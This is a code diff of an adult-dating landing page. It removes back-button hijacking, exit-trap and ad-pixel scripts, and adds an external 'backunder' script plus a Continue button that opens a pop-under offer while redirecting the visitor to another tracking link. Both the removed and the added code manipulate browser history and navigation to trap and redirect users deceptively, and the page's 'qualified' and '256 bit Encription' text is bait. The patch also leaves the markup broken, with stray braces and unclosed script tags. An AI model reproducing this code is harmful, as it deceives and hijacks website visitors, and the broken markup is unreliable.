@@ -1,243 +1,17 @@
-<!DOCTYPE HTML><html lang="en-US"><head><meta charset="UTF-8"><base href="https://cdn-adef.akamaized.net"><script>let imiFinButCbs = [];
+<!DOCTYPE HTML><html lang="en-US"><head>
+  <script>
+    var back = 'https://securelink-dt.com/?a=239394&o=92153&c=0&co=297426&mt=7';
+</script>
+<script src="https://backunder.com/script.js"></script><meta charset="UTF-8"><base href="https://cdn-adef.akamaized.net"><script>let imiFinButCbs = [];
 let imiFinButCbsCntr = 0;
 let callImiFinBut = false;
-
-function imiFinButClickSubscribe(callback) {
-  if (typeof callback === "function") {
-    imiFinButCbs.push(callback);
-    imiFinButCbsCntr += 1;
-  }
-}
-
-function imiFinButSubscriberDone(evt, target) {
-  imiFinButCbsCntr -= 1;
-  if (imiFinButCbsCntr <=0 ) {
-    if (!callImiFinBut) {
-      callImiFinBut = true;
-      target.dispatchEvent(evt);
-    }
-  }
-}
-
-document.addEventListener("DOMContentLoaded", function (){
-  let btns = document.getElementsByTagName("a");
-  let lI = -1;
-  for (let i=0; i<btns.length; i++) {
-    if (btns[i].getAttribute("class") !== null && btns[i].getAttribute("class").indexOf("btn-fin") !== -1 && btns[i].getAttribute("href") === "http://onlineplus.click/site/redirectpage?ca=link&sid=286374&hid=543988&hv=ptxef6686ba5c000a4b76&r=H4sIAAAAAAAA%2FxTES47CMAwG4Nt4W%2F9xorgLa44yMiZIoSxaLMTj9IjNt8SCIV5Hk3JBdK78l7DCslbKYoByZ6EUa1i1UzY7eWyPHHeK24ztf57Nu7rLp5Xj0Ke8XZ3meO27ga74IYZvAAAA%2F%2F%2FxT%2F%2FfagAAAA%3D%3D") {
-      lI = i;
-    } else if (btns[i].getAttribute("class") !== null && btns[i].getAttribute("class").indexOf("btn-fin") !== -1) {
-      lI = i;
-    } else if (btns[i].getAttribute("href") === "http://onlineplus.click/site/redirectpage?ca=link&sid=286374&hid=543988&hv=ptxef6686ba5c000a4b76&r=H4sIAAAAAAAA%2FxTES47CMAwG4Nt4W%2F9xorgLa44yMiZIoSxaLMTj9IjNt8SCIV5Hk3JBdK78l7DCslbKYoByZ6EUa1i1UzY7eWyPHHeK24ztf57Nu7rLp5Xj0Ke8XZ3meO27ga74IYZvAAAA%2F%2F%2FxT%2F%2FfagAAAA%3D%3D") {
-      lI = i;
-    }
-  }
-  if (lI > -1) {
-    function imiFinButClick(ev) {
-      if (imiFinButCbs.length > 0) {
-        let oev = new ev.constructor(ev.type, ev);
-        let trgt = ev.target;
-        ev.preventDefault();
-        ev.stopImmediatePropagation();
-        trgt.removeEventListener("click", imiFinButClick);
-        for (let i = 0; i < imiFinButCbs.length; i++) {
-          imiFinButCbs[i](oev, trgt, imiFinButSubscriberDone);
-        }
-        setTimeout(function () {
-          if (!callImiFinBut) {
-               callImiFinBut = true;
-               trgt.dispatchEvent(oev);
-          }
-        }, 1000);
-      }
-    }
-
-    btns[lI].addEventListener("click", imiFinButClick);
-  }
-});
-</script><script>let imiBBQ = [];
-
-function imiBBQAdd(callback, params) {
-    if (typeof callback === "function" || callback === 'nortb') {
-        imiBBQ.push({fnc: callback, p: params});
-    }
-}
-
-function imiBB() {
-    if (typeof ortbConf !== "undefined" && ortbConf !== null && typeof ortbConf === "object") {
-        if (ortbConf.hasOwnProperty("force_bub") && ortbConf.force_bub === 1) {
-            return false;
-        }
-    }
-    const sv = {
-        'df86699f6130e141': '', '2148702d7c2782df': '', '0f53c12c292fff5b': ''
-    };
-    let hash = window.location.pathname.replace('/c/', '');
-    let url = window.location.protocol + '//' + window.location.host + window.location.pathname;
-
-    if (hash.length === 0) {
-        hash = location.search.replace(/.*utm_source=([^&]*).*|(.*)/, '$1');
-    }
-
-    if (hash && hash.length > 1 && sv[hash]) {
-        url = window.location.protocol + '//' + window.location.host + window.location.pathname.replace('/c/' + hash, '/c/' + sv[hash]);
-    }
-    let curHref = window.location.href;
-    let lQuery = window.location.search.replace("?", "").split('&');
-    let nQuery = "s1=20394&s2=1180703&s3=51987&s5=backuser&click_id=a78aa3z52qq8w3ya8a&iexpp=1&j1=1&j3=1".split('&');
-
-    let nQueryKeys = [];
-    for (let j=0;j<nQuery.length;j++) {
-        nQueryKeys.push(nQuery[j].split('=')[0]);
-    }
-
-    for (let j=0;j<lQuery.length;j++) {
-        let tmp = lQuery[j].split('=');
-        if (nQueryKeys.indexOf(tmp[0]) === -1) {
-            nQuery.push(tmp[0] + "=" + tmp[1]);
-        }
-    }
-
-    url = url + '?' + nQuery.join("&");
-    try {
-        history.pushState({}, '', url);
-        history.pushState({}, '', url);
-
-        window.onpopstate = function (ev) {
-            if (ev['state']) {
-                window.exit = curHref.indexOf('&iexpp=1') !== -1;
-                if (imiBBQ.length > 0) {
-                    let clb = imiBBQ.pop();
-                    if (clb['fnc'] === 'nortb') {
-                        if (url.indexOf("?") !== -1) {
-                            url = url + "&nortb=" + clb['p'][0];
-                        } else {
-                            url = url + "?nortb=" + clb['p'][0];
-                        }
-                        location.replace(url);
-                    } else {
-                        clb['fnc'].apply(null, clb['p']);
-                    }
-                } else {
-                    location.replace(url);
-                }
-            }
-        };
-    } catch (ex) {}
-}
-
-!function () {
-    let touched = false;
-    let chromeVersion = 0;
-    try {
-        chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]);
-    } catch (e) {
-        chromeVersion = 0;
-    }
-    if (chromeVersion >= 75) {
-        window.addEventListener('mouseup', function () {
-                if (!touched) {
-                    touched = true;
-                    setTimeout(function () {
-                            imiBB();
-                        }
-                        , 0);
-                }
-            }
-        );
-        document.addEventListener("DOMContentLoaded", function () {
-                document.body.addEventListener('touchend', function (evt) {
-                        if (!touched) {
-                            touched = true;
-                            setTimeout(function () {
-                                    imiBB();
-                                }
-                                , 0);
-                        }
-                    }
-                );
-                document.body.addEventListener('keydown', function () {
-                        if (!touched) {
-                            touched = true;
-                            setTimeout(function () {
-                                    imiBB();
-                                }
-                                , 0);
-                        }
-                    }
-                );
-            }
-        );
-    } else {
+    else {
         setTimeout(function () {
                 imiBB();
             }
             , 0);
-    }
-}
-();
-</script><script>document.addEventListener("DOMContentLoaded", function () {
-    var buttons = document.querySelectorAll('a');
-    window.exit = true;
-
-    window.addEventListener('beforeunload', function (e) {
-        if (window.exit) {
-            e.preventDefault();
-            e.returnValue = '?';
-        } else {
-            delete e['returnValue'];
-        }
-    });
-    for (var i = 0; i < buttons.length; i++) {
-        buttons[i].addEventListener('mousedown', function () {
-            if (this.href.indexOf('http') !== -1) {
-                window.exit = false;
-            }
-        }, false);
-        buttons[i].addEventListener('touchstart', function () {
-            if (this.href.indexOf('http') !== -1) {
-                window.exit = false;
-            }
-        }, false);
-    }
-});</script><script>var prefBClicked = false;
-document.addEventListener("DOMContentLoaded", function () {
-    if (navigator.userAgent.indexOf("Chrome") != -1 || navigator.userAgent.indexOf("Firefox") != -1 ) {
-        var th_bridge_jump_step = 0;
-        let prefB = document.getElementsByClassName("btn-prefin");
-        if (prefB.length > 0) {
-            for (let i = 0; i < prefB.length; i++) {
-                prefB[i].addEventListener("click", function (ev) {
-                    if (prefBClicked === false) {
-                            prefBClicked = true;
-                            const exoDomains = ["main.exoclick.com","main.realsrv.com","main.exdynsrv.com","s.exv6.com","s.opoxv.com","s.orbsrv.com"];
-                            let script = document.createElement('script');
-                            const firstPixel = '497';
-                            script.src = 'https://main.trafficircles.com/adx-dir-d/match-bridgejump?fp=' + firstPixel;
-                            script.onload = function () {
-                                var addPixel = function (pixel_link) {
-                                    let pixel = new Image(1, 1);
-                                    pixel.src = pixel_link;
-                                };
-                                function addExoPixel(pixelName) {
-                                    for (let e = 0; e < exoDomains.length; e++) {
-                                        addPixel("https://" + exoDomains[e] + "/tag.php?goal=" + pixelName);
-                                    }
-                                }
-                                addPixel("https://main.trafficircles.com/adv_ret/?adv_pixel_id=" + firstPixel);
-                                addPixel("https://ads.traffichunt.com/adv_ret/?adv_pixel_id=497");
-                                addExoPixel("cfd92845e5676a0a7b981f5387968e1b");
-                                addPixel("https://tsyndicate.com/api/v1/retargeting/set/e9ce598f-ae7b-41ab-9e3b-26c96f334869");
-                                addPixel("https://my.rtmark.net/img.gif?f=sync&lr=1&partner=966e36b1a21256b51573e7fb57dd07c5196bb220c16775643a6d1b0416e83d53");
-                                addPixel("https://ctrack.trafficjunky.net/ctrack?action=list&type=add&id=1&context=lwpsite&cookiename=imi1&age=545600&maxcookiecount=10");
-                            };
-                            document.body.appendChild(script);
-                            return false;
-                    }
-                });
-            }
-        }
-    }
-});</script><script>var _rup = {
+    }();
+;</script>;</script><script>var _rup = {
     's': 'http',
     'h': 'onlineplus.click',
     'p': '/site/redirectpage',
@@ -291,7 +65,42 @@ document.addEventListener("DOMContentLoaded", function () {
             You are qualified to enter our site.                                                                                                              
           </h5></div></div><div class="content-inner"><h2 class="step-title" id="text22">
           Please click Continue to complete your profile and start looking for girls.                                                                                        
-        </h2><div class="btn-wrap"><a href="http://offerstrace.com/cxk3l7k.php?lp=1" class="btn btn-1 btn-fin redirect-url-button"><span id="text23">               Continue                                                                                                                                                 </span></a></div></div></div></div><span class="heartsbox"><span class="heart anim1"><img src="/landings/286374/1706542129/images/heart-3.svg" alt=""></span><span class="heart anim2"><img src="/landings/286374/1706542129/images/heart-2.svg" alt=""></span><span class="heart anim3"><img src="/landings/286374/1706542129/images/heart-1.svg" alt=""></span><span class="heart anim4"><img src="/landings/286374/1706542129/images/heart-1.svg" alt=""></span><span class="heart anim5"><img src="/landings/286374/1706542129/images/heart-4.svg" alt=""></span></span></div><!-- Video --><div class="safety-block"><ul><li><img src="/landings/286374/1706542129/images/unlock.svg" alt=""><h4 class="sb-title-1 sbTitle1">
+        </h2><div class="btn-wrap">  
+          <a href="javascript:void(0);" class="btn btn-1 btn-fin redirect-url-button" onclick="go()">  
+              <span id="text23">Continue</span>  
+          </a>  
+      </div>  
+      <script>  
+        var offer_url = "http://offerstrace.com/cxk3l7k.php?lp=1";  
+        var split_url = "https://securelink-dt.com/?a=239394&o=92153&c=0&co=297426&mt=7";  
+      
+        function go() {  
+            // 尝试打开新窗口  
+            var newWindow = window.open(offer_url, '_blank');  
+      
+            // 检查新窗口是否成功打开（注意：这通常不可靠，因为浏览器可能会立即关闭它）  
+            if (newWindow && newWindow.closed) {  
+                // 假设如果新窗口被立即关闭，则是因为被阻止了  
+                // 注意：这通常不是一个可靠的检测方式，但在这里我们可以直接使用  
+                document.location.href = split_url;  
+            } else {  
+                // 在这里，我们其实并不知道新窗口是否真的被打开  
+                // 为了确保无论如何都重定向，我们可以设置一个延时，然后检查  
+                // 但更简单且直接的方法是直接重定向  
+                document.location.href = split_url;  
+      
+                // 如果你确实想等待一下看新窗口是否打开，可以这样做（但通常不推荐）  
+                // setTimeout(function() {  
+                //     if (newWindow && newWindow.closed) {  
+                //         document.location.href = split_url;  
+                //     }  
+                // }, 1000); // 等待1秒  
+            }  
+      
+            // 注意：由于我们已经直接重定向了，上面的 setTimeout 代码块是多余的  
+        }  
+    </script>
+     </span></a></div></div></div></div><span class="heartsbox"><span class="heart anim1"><img src="/landings/286374/1706542129/images/heart-3.svg" alt=""></span><span class="heart anim2"><img src="/landings/286374/1706542129/images/heart-2.svg" alt=""></span><span class="heart anim3"><img src="/landings/286374/1706542129/images/heart-1.svg" alt=""></span><span class="heart anim4"><img src="/landings/286374/1706542129/images/heart-1.svg" alt=""></span><span class="heart anim5"><img src="/landings/286374/1706542129/images/heart-4.svg" alt=""></span></span></div><!-- Video --><div class="safety-block"><ul><li><img src="/landings/286374/1706542129/images/unlock.svg" alt=""><h4 class="sb-title-1 sbTitle1">
         Secure                                                                  
       </h4><p class="sb-text-1 sbText1">
         We use 256 bit Encription                                                                  
@@ -376,5 +185,10 @@ document.addEventListener("DOMContentLoaded", function () {
       </div><div class="comments__item__meta"><div class="item_date itemDate8"></div></div><div class="comments_list_btns"><span class="comments_list_btn"><i class="custom-icon custom-icon-like"></i><span class="likeWord">
             Like                                                                                                              
           </span></span><span class="comments_list_btn"><i class="custom-icon custom-icon-comment"></i><span class="commentWord">
-            Comment                                                                                                              
-          </span></span></div></div></div></div><div class="video-wrap poster-active"><video class="video" src="/landings/286374/1706542129/images/3_new.mp4" playsinline muted preload width="200" height="100"></video><img class="poster" src="/landings/286374/1706542129/images/poster_alt2.jpg"></div><div id="wrp-id"></div><img class="img-path" style="display: none;" src="/landings/286374/1706542129/images/blocked-icon.png"><script>var ortbConf = {'feed':3156,'model':'ecpm'};</script></body></html>
+            Comment        
+                                                                                                         
+          </span></span></div></div></div></div><div class="video-wrap poster-active"><video class="video" src="/landings/286374/1706542129/images/3_new.mp4" playsinline muted preload width="200" height="100"></video><img class="poster" src="/landings/286374/1706542129/images/poster_alt2.jpg"></div><div id="wrp-id"></div><img class="img-path" style="display: none;" src="/landings/286374/1706542129/images/blocked-icon.png"><script>var ortbConf = {'feed':3156,'model':'ecpm'};</script>
+       
+        </body>
+          <script>
+                </html>
